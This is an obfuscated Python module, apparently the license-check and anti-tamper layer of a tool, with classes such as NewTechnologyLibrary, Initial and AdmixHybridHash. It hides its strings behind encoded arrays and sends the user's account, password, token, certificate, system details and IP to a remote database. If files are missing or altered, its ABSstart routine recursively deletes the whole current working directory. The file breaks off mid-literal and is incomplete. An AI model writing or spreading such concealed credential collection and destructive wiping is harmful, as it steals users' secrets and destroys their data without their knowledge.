import shutil
import platform
import traceback
import time
import os
from PlinePMD.Tools import RegexPMD,ReprPMD,ProcessServerPMD,BasePMD,ThreadingPMD,FlushEcho,WhichSystem
from PlinePMD.CryptoApi import CryptoCanvas,CryptoCarry
from NewlyPlated import hashdata

class NewTechnologyLibrary(object):

    def Whirl():
        ciphertext = [
            0b1101100,
            0b1110010,
            0b1110111,
            0b1110100,
            0b1100001,
            0b1011100,
            0b1111001,
            0b1100100,
            0b1001110,
            0b1100111,
            0b1101100,
            0b1100101,
            0b1010000,
            0b1101000,
            0b1100101,
            0b1100101,
            0b1110100,
            0b1100001,
            ]
        cipherarray = (
            (0o44 ^ 0x32) % 8,
            0x254 >> 0o400 ^ 0x11,
            0b10 + (0b100 >> 0o74 << 1),
            0o724 >> 0b10 // 1 >> 3,
            0b101 + 34 % 0x9 // 0o3,
            (0o77 ^ 0xd3 // 0b1011) >> 0x2,
            0xe8c & 5,
            0xe * 0b110 >> 2 % 0xc >> 1,
            (0xa4 >> 5 ^ 1) - 0b100,
            (0x1d ^ 0o55) >> 1 + (0b11 ^ 2),
            0xfb // 3 ^ 0x50,
            22 ^ 0o15 * 0b1 >> 1 % 4,
            0x4 % (99 ^ 0x79) + 0b01,
            0x0d ^ 3 >> 0o7 % 0b10 << 0b01,
            2 + 0o3 ^ 7 & 0b100 ^ 8,
            (35 ^ 0xe) >> 5,
            0x3f0 - (0xfa << 0b10),
            0o35 - (4 ** 0b101 >> 0x6),
        )
        newlist = [0] * (ciphertext[0] // cipherarray[0])
        for i in range(len(cipherarray)):
            newlist[cipherarray[i]] = ciphertext[i]
        plaintext = CryptoCarry.Binary(newlist,demode=3).decrypt()
        if WhichSystem.Dealwith().casefold() in ['windows','java']:
            Main = ''.join((os.getcwd(),'\\',plaintext.replace('/','\\'),'\\'))
        else:
            Main = ''.join((os.getcwd(),'/',plaintext.replace('\\','/'),'/'))
        Routing = os.listdir(Main)
        Routing.sort()
        counter = 0
        try:
            from PlinePMD.CryptoApi import File
            for IDM in range(len(Routing)):
                Routing[IDM] = File(Main+Routing[IDM]).read()
                counter += 1
            return Routing
        except FileNotFoundError:
            Initial.ABSstart()
        finally:
            if counter != 15:
                if FlushEcho.CaseONI(Routing[2],Routing[0],Routing[1],False).startswith('try'):
                    FlushEcho.CaseONI(Routing[2],Routing[0],Routing[1])
                else:
                    Initial.ABSstart()

class Plat(object):

    def __init__(self) -> None:
        self.MAINFACE = NewTechnologyLibrary.Whirl()

    def SystemLoad(self):
        plat = [
            platform.system(),
            platform.python_version(),
            platform.architecture(),
            platform.node(),
            platform.platform(),
            platform.processor(),
            platform.machine(),
            platform.python_build(),
            platform.python_compiler(),
            platform.version(),
            platform.uname()
        ]
        return plat

    @property
    def LinqLoad(self):
        TQMSA = AdmixHybridHash()
        TQMSA.PropertyMotionDevice_SELECT_LINQ_Library()
        return TQMSA.cnxn,TQMSA.crsr

    @property
    def Handle(self):
        plat = self.SystemLoad()
        self.os,self.ver = plat[0],plat[1]
        result = FlushEcho.CaseONI(self.MAINFACE[3],self.MAINFACE[0],self.MAINFACE[1],False)
        result = ProcessServerPMD(result).GetSessionResult
        self.iprot = RegexPMD(r'\d+\.\d+\.\d+\.\d+',result).regexlist[0]
        self.mktime = int(time.time())
        self.version = '1.0.0'

    def __repr__(self) -> str:
        return ReprPMD(self).repr

    def __eq__(self, other) -> bool:
        return isinstance(other, self.__class__) and self.__dict__ == other.__dict__

    def __ne__(self, other) -> bool:
        return not (self == other)

def Conduct(MAINFACE):
    FlushEcho.CaseONI(MAINFACE[2],MAINFACE[0],MAINFACE[1])

class Initial(object):

    def __init__(self) -> None:
        self.MAINFACE = NewTechnologyLibrary.Whirl()
        self.cnxn = None
        self.crsr = None
        self.mid = str()
        self.acc = str()
        self.pwd = str()
        self.token = str()
        self.cert = str()
        self.app = str()
        self.type = 0x0

    def TaskResult(self):
        self.linq = Plat()
        self.linq.Handle
        try:
            self.cnxn, self.crsr = self.linq.LinqLoad
        except Exception as error:
            if ('None' or 'file not found') in error:
                print(CryptoCanvas.Print.red()+'Please install the LINQ suite first ^^'+CryptoCanvas.Print.attr(0))
                os._exit(0)
        self.PropertyMotionDevice_NewProcessing()
        self.TheFirst()

    def TheFirst(self):
        if RegexPMD(r'^u[\da-f]{32}',self.mid).regex == None:
            raise EOFError('Don\'t mess with the file ^^')
        self.crsr.execute(FlushEcho.CaseONI(self.MAINFACE[4],self.MAINFACE[0],self.MAINFACE[1],False) % self.mid)
        result = self.crsr.fetchall()
        if result == []:
            self.crsr.execute(FlushEcho.CaseONI(self.MAINFACE[5],self.MAINFACE[0],self.MAINFACE[1],False) %
            (self.mid, self.acc, self.pwd, self.token, self.cert, self.linq.os, self.app, self.linq.ver, self.linq.iprot, self.linq.mktime, 0))
        else:
            for _ in result:
                if self.type == 0x1:self.crsr.execute(FlushEcho.CaseONI(self.MAINFACE[6],self.MAINFACE[0],self.MAINFACE[1],False)
                % (self.acc, self.pwd, self.cert, self.token, self.linq.os, self.app, self.linq.ver, self.linq.iprot, self.linq.mktime, self.mid))
                elif self.type == 0x2:self.crsr.execute(FlushEcho.CaseONI(self.MAINFACE[7],self.MAINFACE[0],self.MAINFACE[1],False)
                % (self.token, self.linq.os, self.app, self.linq.ver, self.linq.iprot, self.linq.mktime, self.mid))
                else:raise EOFError('Don\'t mess with the file ^^')
        self.cnxn.commit()

    def MailFirst(self,value):
        if self.crsr == None:
            self.linq = Plat()
            self.cnxn, self.crsr = self.linq.LinqLoad
        self.crsr.execute(FlushEcho.CaseONI(self.MAINFACE[8],self.MAINFACE[0],self.MAINFACE[1],False) % value)
        result = self.crsr.fetchall()
        if result == []:return None
        elif result[0].cert == None or result[0].cert == '':return None
        else:return result[0].cert

    def ABSstart():
        try:
            name = os.getcwd()
            tkill = ThreadingPMD(shutil.rmtree,args=(name,))
            tkill.start()
            tkill.join()
        finally:
            os._exit(0)

    def SelectLinePath(self):
        self.crsr.execute(FlushEcho.CaseONI(self.MAINFACE[9],self.MAINFACE[0],self.MAINFACE[1],False) % self.linq.version)
        All = self.crsr.fetchall()
        for i in All:
            yield i.Fname,i.Fbyte,i.Ftype

    def GetDirSize(self,dir):
        size = int()
        for root, dirs, files in os.walk(dir):
            if '__pycache__' not in root:
                size += sum([os.path.getsize(os.path.join(root, name)) for name in files])
        return size

    def GetFileSize(self,file):
        return os.path.getsize(file)

    def Assertion(self,result):
        if result == []:
            self.crsr.execute(FlushEcho.CaseONI(self.MAINFACE[10],self.MAINFACE[0],self.MAINFACE[1],False) %
            (self.mid, self.acc, self.pwd, self.token, self.cert, self.linq.os, self.app, self.linq.ver, self.linq.iprot, self.linq.mktime, 1))
            self.cnxn.commit()
            print(CryptoCanvas.Print.red()+FlushEcho.CaseTNC(self.MAINFACE[13],self.MAINFACE[0],self.MAINFACE[1],False)+CryptoCanvas.Print.attr(0))
            os._exit(0)
        else:
            for i in result:
                if i.implement == 0:
                    self.crsr.execute(FlushEcho.CaseONI(self.MAINFACE[11],self.MAINFACE[0],self.MAINFACE[1],False) % (1, self.linq.iprot,self.mid))
                    self.cnxn.commit()
                    print(CryptoCanvas.Print.red()+FlushEcho.CaseTNC(self.MAINFACE[13],self.MAINFACE[0],self.MAINFACE[1],False)+CryptoCanvas.Print.attr(0))
                    os._exit(0)
                elif i.implement == 1:
                    self.crsr.execute(FlushEcho.CaseONI(self.MAINFACE[11],self.MAINFACE[0],self.MAINFACE[1],False) % (2, self.linq.iprot,self.mid))
                    self.cnxn.commit()
                    print(CryptoCanvas.Print.red()+FlushEcho.CaseTNC(self.MAINFACE[14],self.MAINFACE[0],self.MAINFACE[1],False)+CryptoCanvas.Print.attr(0))
                    Conduct(self.MAINFACE)

    def PropertyMotionDevice_NewProcessing(self):
        self.crsr.execute(FlushEcho.CaseONI(self.MAINFACE[12],self.MAINFACE[0],self.MAINFACE[1],False) % (self.linq.iprot,self.mid))
        result = self.crsr.fetchall()
        for i in result:
            if i.implement == 2:
                FlushEcho.NewSend(CryptoCanvas.Print.red()+hashdata.Sacred()+CryptoCanvas.Print.attr(0))
                Conduct(self.MAINFACE)
        for P,M,D in self.SelectLinePath():
            if D.casefold() == 'dir':
                size = self.GetDirSize(P)
                if size != M:
                    self.Assertion(result)
            elif D.casefold() == 'file':
                size = self.GetFileSize(P)
                if size != M:
                    self.Assertion(result)

class AdmixHybridHash(object):

    def __init__(self) -> None:
        self.MAINFACE = NewTechnologyLibrary.Whirl()
        self.foo = (
            [0x59, 0x58, 0x4e, 0x7a, 0x5a, 0x58, 0x4a, 0x30, 0x49, 0x47, 0x6c, 0x7a, 0x61, 0x57, 0x35, 0x7a, 0x64, 0x47, 0x46, 0x75, 0x59, 0x32, 0x55, 0x6f, 0x64, 0x47, 0x56, 0x34, 0x64, 0x43, 0x78, 0x69, 0x65, 0x58, 0x52, 0x6c, 0x63, 0x79, 0x6b, 0x3d],
            [0x64, 0x32, 0x6c, 0x30, 0x61, 0x43, 0x42, 0x76, 0x63, 0x47, 0x56, 0x75, 0x4b, 0x43, 0x64, 0x51, 0x62, 0x47, 0x6c, 0x75, 0x5a, 0x56, 0x42, 0x4e, 0x52, 0x43, 0x39, 0x6c, 0x64, 0x47, 0x4d, 0x76, 0x5a, 0x6d, 0x39, 0x76, 0x4c, 0x6d, 0x4a, 0x70, 0x62, 0x69, 0x63, 0x73, 0x4a, 0x33, 0x4a, 0x69, 0x4a, 0x79, 0x6b, 0x67, 0x59, 0x58, 0x4d, 0x67, 0x63, 0x6d, 0x56, 0x68, 0x5a, 0x47, 0x56, 0x79, 0x4f, 0x67, 0x3d, 0x3d],
            [0x64, 0x32, 0x6c, 0x30, 0x61, 0x43, 0x42, 0x76, 0x63, 0x47, 0x56, 0x75, 0x4b, 0x43, 0x64, 0x51, 0x62, 0x47, 0x6c, 0x75, 0x5a, 0x56, 0x42, 0x4e, 0x52, 0x43, 0x39, 0x6c, 0x64, 0x47, 0x4d, 0x76, 0x55, 0x32, 0x39, 0x79, 0x64, 0x43, 0x35, 0x69, 0x61, 0x57, 0x34, 0x6e, 0x4c, 0x43, 0x64, 0x79, 0x59, 0x69, 0x63, 0x70, 0x49, 0x47, 0x46, 0x7a, 0x49, 0x48, 0x4a, 0x6c, 0x59, 0x57, 0x52, 0x6c, 0x63, 0x6a, 0x6f, 0x3d],
            [0x49, 0x43, 0x41, 0x67, 0x49, 0x48, 0x52, 0x6c, 0x65, 0x48, 0x51, 0x67, 0x50, 0x53, 0x42, 0x79, 0x5a, 0x57, 0x46, 0x6b, 0x5a, 0x58, 0x49, 0x75, 0x63, 0x6d, 0x56, 0x68, 0x5a, 0x43, 0x67, 0x70],
            [0x5a, 0x47, 0x55, 0x67, 0x50, 0x53, 0x42, 0x68, 0x5a, 0x58, 0x4d, 0x75, 0x5a, 0x47, 0x56, 0x6a, 0x63, 0x6e, 0x6c, 0x77, 0x64, 0x43, 0x68, 0x30, 0x5a, 0x58, 0x68, 0x30, 0x4b, 0x51, 0x3d, 0x3d],
            [0x49, 0x43, 0x41, 0x67, 0x49, 0x43, 0x41, 0x67, 0x49, 0x43, 0x42, 0x79, 0x5a, 0x57, 0x46, 0x6b, 0x5a, 0x58, 0x49, 0x75, 0x59, 0x32, 0x78, 0x76, 0x63, 0x32, 0x55, 0x6f, 0x4b, 0x51, 0x3d, 0x3d],
            [0x63, 0x32, 0x56, 0x73, 0x5a, 0x69, 0x35, 0x76, 0x62, 0x6d, 0x6b, 0x67, 0x50, 0x53, 0x42, 0x6b, 0x5a, 0x53, 0x35, 0x6b, 0x5a, 0x57, 0x4e, 0x76, 0x5a, 0x47, 0x55, 0x6f, 0x4a, 0x33, 0x56, 0x30, 0x5a, 0x69, 0x30, 0x34, 0x4a, 0x79, 0x6b, 0x3d],
            [0x49, 0x43, 0x41, 0x67, 0x49, 0x43, 0x41, 0x67, 0x49, 0x43, 0x42, 0x72, 0x5a, 0x58, 0x6b, 0x67, 0x50, 0x53, 0x42, 0x79, 0x5a, 0x57, 0x46, 0x6b, 0x5a, 0x58, 0x49, 0x75, 0x63, 0x6d, 0x56, 0x68, 0x5a, 0x43, 0x67, 0x70],
            [0x49, 0x43, 0x41, 0x67, 0x49, 0x48, 0x4a, 0x6c, 0x59, 0x57, 0x52, 0x6c, 0x63, 0x69, 0x35, 0x6a, 0x62, 0x47, 0x39, 0x7a, 0x5a, 0x53, 0x67, 0x70],
            [0x59, 0x57, 0x56, 0x7a, 0x49, 0x44, 0x30, 0x67, 0x51, 0x55, 0x56, 0x54, 0x58, 0x30, 0x4e, 0x55, 0x55, 0x69, 0x68, 0x72, 0x5a, 0x58, 0x6b, 0x70],
            [0x59, 0x58, 0x4e, 0x7a, 0x5a, 0x58, 0x4a, 0x30, 0x49, 0x47, 0x6c, 0x7a, 0x61, 0x57, 0x35, 0x7a, 0x64, 0x47, 0x46, 0x75, 0x59, 0x32, 0x55, 0x6f, 0x61, 0x32, 0x56, 0x35, 0x4c, 0x47, 0x4a, 0x35, 0x64, 0x47, 0x56, 0x7a, 0x4b, 0x51, 0x3d, 0x3d],
        )
        self.sort = [
            '6e 65 63 74 69 6f 6e 20',
            '72 65 74 75 72 6e 20 63',
            '28 73 65 6c 66 2e 6f 6e',
            '6f 64 62 63 2e 43 6f 6e',
            '3d 20 63 6e 78 6e 2e 63',
            '6e 78 6e 20 3d 20 70 79',
            '3d 20 70 79 6f 64 62 63',
            '3a 20 70 79 6f 64 62 63',
            '6e 78 6e 2c 63 72 73 72',
            '2e 63 6f 6e 6e 65 63 74',
            '75 72 73 6f 72 28 29 0a',
            '2e 43 75 72 73 6f 72 20',
            '69 29 0a 63 72 73 72 20'
        ]
        self.LOK = [
            0x01 | (0x02 << 0x01),
            (0x65 ^ 0b0101) >> 0x05,
            ((0xf7 * 0x1a) >> 0x01) & 0xce % 0o212,
            ((0x74 ^ 0x15) & 3) * 0b110,
            0x01 + ((0x35 << 0x02) & 0x05) * 2,
            (0x48 | 0x07) >> 0b101,
            (0x08 | 0b11) + 0o01,
            0x07 * 0b0111 % 0x15,
            (0xa1 >> 0o5) + 0x06,
            (0xff >> 0b11) % 0x1b,
            (0xaef >> 3) % 27 - 0xf,
            0xa7 & 0x12 << 0x4 ^ 33,
            (0xbc >> 0o05) + 0x03
        ]
        self.NKE = [
            0x73, 0x65, 0x6c, 0x66, 0x2e, 0x63, 0x6e, 0x78, 0x6e, 0x20, 0x3d, 0x20, 0x70, 0x79, 0x6f, 0x64, 0x62, 0x63, 0x2e, 0x43, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x3d, 0x20, 0x70, 0x79, 0x6f, 0x64, 0x62, 0x63, 0x2e, 0x63, 0x6f, 0x6e, 
            0x6e, 0x65, 0x63, 0x74, 0x28, 0x73, 0x65, 0x6c, 0x66, 0x2e, 0x6f, 0x6e, 0x69, 0x29, 0x0a, 0x73, 0x65, 0x6c, 
            0x66,             0x2e,             0x63,             0x72,             0x73,             0x72,             0x20,             0x3a,             0x20,             0x70,             0x79,             0x6f,             0x64,             0x62,             0x63,             0x2e,             0x43,             0x75,             0x72,             0x73,             0x6f,             0x72,             0x20, 
            0x3d,             0x20,             0x73,             0x65,             0x6c,             0x66,             0x2e,             0x63,             0x6e,             0x78,             0x6e,             0x2e,             0x63,             0x75,             0x72,             0x73,             0x6f,             0x72,             0x28,             0x29  
        ]
        self.LOG = [0x2588,0x2588,0x2557,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x2588,0x2588,0x2557,0x20,0x20,0x20,0x20,0x2588,0x2588,0x2588,0x2557,0x20,0x20,0x20,0x2588,0x2588,0x2557,0x20,0x20,0x20,0x20,0x2588,0x2588,0x2588,0x2588,0x2588,0x2588,0x2588,0x2557,0x20,0x20,0x20,0x20,0x2588,0x2588,0x2588,0x2588,0x2588,0x2588,0x2557,0x20,0x20,0x20,0x20,0x20,0x2588,0x2588,0x2588,0x2557,0x20,0x20,0x20,0x2588,0x2588,0x2588,0x2557,0x20,0x20,0x20,0x20,0x2588,0x2588,0x2588,0x2588,0x2588,0x2588,0x2557,0x20,0xa,0x2588,0x2588,0x2551,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x2588,0x2588,0x2551,0x20,0x20,0x20,0x20,0x2588,0x2588,0x2588,0x2588,0x2557,0x20,0x20,0x2588,0x2588,0x2551,0x20,0x20,0x20,0x20,0x2588,0x2588,0x2554,0x2550,0x2550,0x2550,0x2550,0x255d,0x20,0x20,0x20,0x20,0x2588,0x2588,0x2554,0x2550,0x2550,0x2588,0x2588,0x2557,0x20,0x20,0x20,0x20,0x2588,0x2588,0x2588,0x2588,0x2557,0x20,0x2588,0x2588,0x2588,0x2588,0x2551,0x20,0x20,0x20,0x20,0x2588,0x2588,0x2554,0x2550,0x2550,0x2588,0x2588,0x2557,0xa,0x2588,0x2588,0x2551,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x2588,0x2588,0x2551,0x20,0x20,0x20,0x20,0x2588,0x2588,0x2554,0x2588,0x2588,0x2557,0x20,0x2588,0x2588,0x2551,0x20,0x20,0x20,0x20,0x2588,0x2588,0x2588,0x2588,0x2588,0x2557,0x20,0x20,0x20,0x20,0x20,0x20,0x2588,0x2588,0x2588,0x2588,0x2588,0x2588,0x2554,0x255d,0x20,0x20,0x20,0x20,0x2588,0x2588,0x2554,0x2588,0x2588,0x2588,0x2588,0x2554,0x2588,0x2588,0x2551,0x20,0x20,0x20,0x20,0x2588,0x2588,0x2551,0x20,0x20,0x2588,0x2588,0x2551,0xa,0x2588,0x2588,0x2551,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x2588,0x2588,0x2551,0x20,0x20,0x20,0x20,0x2588,0x2588,0x2551,0x255a,0x2588,0x2588,0x2557,0x2588,0x2588,0x2551,0x20,0x20,0x20,0x20,0x2588,0x2588,0x2554,0x2550,0x2550,0x255d,0x20,0x20,0x20,0x20,0x20,0x20,0x2588,0x2588,0x2554,0x2550,0x2550,0x2550,0x255d,0x20,0x20,0x20,0x20,0x20,0x2588,0x2588,0x2551,0x255a,0x2588,0x2588,0x2554,0x255d,0x2588,0x2588,0x2551,0x20,0x20,0x20,0x20,0x2588,0x2588,0x2551,0x20,0x20,0x2588,0x2588,0x2551,0xa,0x2588,0x2588,0x2588,0x2588,0x2588,0x2588,0x2588,0x2557,0x20,0x20,0x20,0x20,0x2588,0x2588,0x2551,0x20,0x20,0x20,0x20,0x2588,0x2588,0x2551,0x20,0x255a,0x2588,0x2588,0x2588,0x2588,0x2551,0x20,0x20,0x20,0x20,0x2588,0x2588,0x2588,0x2588,0x2588,0x2588,0x2588,0x2557,0x20,0x20,0x20,0x20,0x2588,0x2588,0x2551,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x2588,0x2588,0x2551,0x20,0x255a,0x2550,0x255d,0x20,0x2588,0x2588,0x2551,0x20,0x20,0x20,0x20,0x2588,0x2588,0x2588,0x2588,0x2588,0x2588,0x2554,0x255d,0xa,0x255a,0x2550,0x2550,0x2550,0x2550,0x2550,0x2550,0x255d,0x20,0x20,0x20,0x20,0x255a,0x2550,0x255d,0x20,0x20,0x20,0x20,0x255a,0x2550,0x255d,0x20,0x20,0x255a,0x2550,0x2550,0x2550,0x255d,0x20,0x20,0x20,0x20,0x255a,0x2550,0x2550,0x2550,0x2550,0x2550,0x2550,0x255d,0x20,0x20,0x20,0x20,0x255a,0x2550,0x255d,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x255a,0x2550,0x255d,0x20,0x20,0x20,0x20,0x20,0x255a,0x2550,0x255d,0x20,0x20,0x20,0x20,0x255a,0x2550,0x2550,0x2550,0x2550,0x2550,0x255d,0x20,0xa,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20]
        self.crsr,self.cnxn = None,None

    def RouteResolution(self,isin):
        assert isinstance(isin,bytes)
        a = BasePMD(isin,1,'utf-8').b64PMD
        return a.decode('utf-8')

    def PropertyMotionDevice_SELECT_LINQ_Library(self):
        NARRAY = [
            b'\x94~<\xb7\xf7\x9d\xd9\xcd\x1a\xd8[\xec\xf4\xf6\xe7\xbe\xc6/\n\xfd\x17#&\xbaOe\xd1\x1cZ\xc3\x14^',
            b'j `\xb0:\x13i\xb4xO\x95T\x01\x13\xc2\xb4',
            b'\xfa\x92\xdc;\x9a\x13(v',
            b'(\x9dV\xb5\xe4Z\xea\n'
        ]

        Crypts = [
            b"u\x96'Y\xe8p\xaa>O\x96\xaf\xdc\xed\xb7H\x13t\x9a\x11\xc2t\xff\xb9\xe7L\x15?\xb3\x85\x9e\x0cM",
            b"\xee3\xe8\xcfG\xcf\xb45D\xe6O\xba\xb6#\x87-z\xdf\x18K\xb2!\x1e\xee&\xea`\xb4Z6fR\xda<$\xa2Nl\xc7z\x8fEHRh\x103\x8e\x86'\xeaP\xc8\x7f\xd3Ye\xd9\xf5>\xe3\xa4\xcb\xbd{\xfd\xd0\x10\xd4\x964\x99\xdd(\x05\xb0ie\xe2\xb5d\x83\xe5\x00\xc6\x95\x04\x937\x92\xa5Ga\xd6\x06\x84y\xe9",
            b'\x1e\xf3\xd1\xb8\xcaT)\xe4\x03Z\x1e\x16\x10\xce\xe8\xbeE\xa7\xe1\xa7_\xa2\xcb\r\x00\xfc\x1cT\xa5[g\x8e\x08\x81\x14j\xf5yj6\x18\xb9\xd4\xeds\xad7\x19\xeb\xda\xc6\xcc\x81\xe6\xe4\xd2\x82\x96\xb1)\x8f\xce\xa2\xf5\xf0',
            b'\xdb<Y#\x93o\x7f\xac\xe8\xeb\xa2\xc6\xf6\xa1\xe1t\x1c\xacB\xb5`\x07^-\x1b\x00\xfd\xaeX\xf9**,\x86nY\nL\xc7\x94\x85\xc5\xdc\x7f]=O\x16',
            b'm\x91\x91\xa0\x90\'h\x87^\x11H\x17E\x8f\x89\xcb"\xc9\xa1\xa8\x0e\x9a\x89sX\x91o\x01\xdcU\x15\xf7i\xe9l\x0b\x97{',
            b"\xa6\xc1nn['8?\x83?\xeb\xd5|\x90\xc8\xbcK\xcd\xa8R\xb4\xb2\xe0\xb8\xc1\xec^\xc0\xc72\xf2\xe0nk\x00=\x19\xa6\x90)\t\x1a(\xc3\xd8\x7f5\x8d\xea\xd5\xc77\xf8\x06(\xef7\xbc\xdc<hf\xa8\xdd",
            b'\x9dQ\xa8\xd7\x1d\xbc\xf7((\xf0\x1a\xa6\xd0c\xd2W \xd4MA\xc6dt\x96u\x99<\x97',
            b"\x044(\xfd\xa2\xe5\xd1\xee\x878#\x96{`\x81\xed\xde\x04\xa0FCF\x90[v\x1a\x06\xdb\xef\xbeK\xb7\x84\xf6'\x87\xb0o\x88v\xb0\x0b\xe1\xf1\xe7\x9c\xdd\xb9\xa4\t\x14U\xc7\x12\x93\x8d",
            b'^\xf2-\xb8W\xb2|\xa4\xb6\xf4\x9b\xaf\xf9\xfa\x1f\xd6\\\x14,\x11\xfb\\\xd7[\xa9\xf7Ek\x81\xb2\xb2\xd8\x95(\xcf\x8a\xd4\xdd\x9f\xa1\xd5P^\xc3\xfd\x14\xe9\xf4',
        ]
        EC = b'\xfeHb\xf5\xce\xb9Q\x93\x94\xd2\xdc@&\x92l\x996\xa1bZ:\x96\x8a\xfa\xa5?\xdafC|\xe3Z\xf1\x97\xa9\xb4\xce\x93\xe1\xdb\xe8\x18\xeev3\x19\xca\t\x8b\xd7\x009`.N\xe4]v\x1d\xe5\x90A\xfd\xf8 \xc3~J\xc6\xca=\xb7^\x0e\xaeu\x9b\x17\xf2\xb8L\xcd\xb4{\xd5\xc0\xb5LJ6\xc7\xd9\xb5\x81\x89\xb4;\x92\xe5\xc1\xab\x1f\xd8\x02\xb6\x92)\xbc\xddt\xcc\x18\xdfb1>\xc4\x12m\xd9\x07\xba\x9avJ\x17\xb4\x00\xfbI\xbe:\xeb\x87~\x07\xf4\xc5\xbc@\xa8*?O\x06]\x07\xcb\x9c\x16\xbe>\te\xf8\xe0o\xf2\x15\x1c\xef\x97\xd7\x1dP\x04\xabQ\xac\t\xf4\xf1\xa8\\\x9d(\xfc\x81#\xbd+\xc4\xe9Q\xf4\x1a\xb0\xac\x95p&\x81V\xc6\xdd\x19\x80\x86\x10\xb3\xb2&d\xf7\x8b]NT\x92\x92\xb0\xef\xab\x1f\x84\x17\xe3\x0b\xf2\x1d\xea{\xa7\x94\xfc\xad\xf6W\x83V\x7f\xb3b\xeb\xd8\x9d\xf9\xf5_\xaf\x9f\xb7L\xbf=\xa7#\x0e\x84\x89?\x16\x11\xb4Vl(\xe3P\xd8\x1f\xa7\x88vX\xf1\xf1\xe1\xa0V6\xc2Q<3/\xc8\xad\xea\x8a\xfc\xaf\x96\xba\x82\x08p.\xf6}\x01\x90\xf2W>\x10\x87\x14u\xcb\xa5\x86\xf8\x8b\xcdz\x02i\x9fr)1;\x1c\xd0k\xb4\xfbg\x1d\xf2\x05;\x13\xa0\x884c\xf1\xde\xd6\xcb\xb9\x11b\xa5\n\xf3\x04c\xa9\x9c\x12[}\xda]\xfa\xe0q\x1bz\xed\xdaA\xab\xb3\xa5,\xcd\x127\xd3\xf9\xaf\xac\xdf\xeaw\x1d)\x7f\x97?t\xd0\xc4\x85\x92\xf1\xec7\xeff2\xa6X\x8e\x1a\x03\\\x97a \xfa\xcb\x05\xd8\x86\xe3T\x03=.M\xf0=\x03\xfe\xf7\x8d\'\x83\n\xc4\xcf\x8f/B/\xd1\x19\xfc\xd9\xc2\xad\xba\xc1\xa9\x12\x8f\x0b\xdd+\xe6:\xd7g|2\x9e(\xf3\x97\xc6\xe3h\xbc\x1d\xaaZ(J\x9f\xe7\n\x1bc\xbc\xe4\x1c4\xf5\xf5\x0c\xfe\x80\x81\xa3\xe0\'\xd1\xde\xab\x97\x06\xfb\x0b\xc5\xfa\x07\xd0\x82\x0b\xf6\x9f\x8b\xe1\x8e\xc4\xe1vO\x80\r\xa3\xc7\x92+#\x8d\x98K!\xb0\xe3\r\x8e0\xea\xb0*p@\xcby\xf2\x8b\xfbN\x86\xa8L5\x88\xa3@\xa5-I[W\\\xd3\xd7\xc6T.\xfd$\xa5\x8eCH\x15\x00g\xb7\x9aKoH\xc6\xc1\xca\x08\xcf\x00\xcb\x7fvBL\x80\xaeP\xb3\x1b\xe2\x1a\xba u\x1c\xd0\xe3\n\xacYiv\x95\xd4\xaa\x18\x98\x0bp\x93\xf5\t~*p")~n{\x8a\xd5Je\t\xdf:\xc8\xd4\xd4b\xe3\x17\x9a\xba\xf6\xa4\xe4&\x1b~\xb4\xe4C\t\xca\xb0\x9ar\x14\xf5\xe5\xae\xe6\x85\x9c\x12\xb1\xc7dl{\xa7\xd5\x97\xf8\xdb.\xc87<\xf6\x94\xa7\xacB\xdaI\ry!\xdf\xb9\xebm\x91\xe3\xf1\x80H\x13\xc6\xba\x06\x89\x1d?\xf2d\xcd\x9e\xf6\xca!z2\xcbl\x175\x88\'\xd6\xfe\x16y\xa1c\xa0l\xe2zc(\xb1\x81\xa6\xde\x81\x89}\xe8\xce\xde\xf5\x07\x18\x7f:\xb5\x8d\x9e\x95\xe3\r\x08\xea%-\x99\x02\xf9,\x1ap\x1c\x06\xc8\xde\xc1vo\xca\xcd+\xea\xcc\xe4\x02\xd0\x1b\x90\x91\xa0\xba\xfc\x86\x92\x9e5.\xb8\xe6U\xcbx\xfe\xff\xac\xf6M\n*$\x94\x9a#t\xf4Tc\x10\x88\xc7kO@\x0e\xf24\xd7:\xd0$\x94\x17\xa2\t\x85u\xff\xd8f\xd9*\xd2\xe8\xa4M;\x82\x14\xcb?\x9b\xaa\xd8\xf9 J4\x13#B.\xb6\xb2Q\xe0c\xe2\x8b\xfd\xf6\xd3p\x1a9\xda\x89\xdd\xc9\xf0\x13\x89\x80\x9c\xc9\xdd\xb3\xc7\xffM\xc5\xd95\xad\x00\tc\xc4\x90\xb15\xd1\xd5\xd6\x84\xdd\x1c\\m\xbb\x95\xcd3\xd2Q5\x01\xdc*7f\xbf"\x1b\xcd\xdc"\xd4\xfd\x10r\xb5#\xad\x1f\xa2\xa1\x93\x90\xcfo-^\xe5\xdea\x18\x86@?\xaf\x8e\x16*Tg;\xa6\xdd\x13\xb2"T\xfc-\x161X\x8f1\xe4\xcd\x119-\xb0\x0f5BK\x07\x906AI\xea\xe0\x0e\xb3\x04\xef\x07u\xd1\xda`/7\x9e\xc3}\xb8\x93\xbc\xf8\xbf\xe2\x19\xf1\x9au=w\x80\xfc\x014?j\x8f\x1dI\xc65\x04\xb2\x9d\xfcX\xbc\x82\xf9\xb3\xc7\t\xa9\xb4\xa6\xd7\x95f?\xea\xecU%\xc0\x8e\xe0\xe6\x80n\xdb\xcf\xf4\xa1P\xd27\xbe\xb2\x9bF@\x03\xc7HH\x1d6\xdd\x19\xddf\x02\xb2\x04\x83\xfb\xd0\x9b\n\xda\x94\xb6|N\xe4\xdb\xee_Z0\xa4\xe0\xcdl9\x9e\xf1\xab\xb1c6\xcf\x1d\xb0\xf9t\xd1\xff\xd8@\xe4\xad\xd6G\xb8X\xd81\xf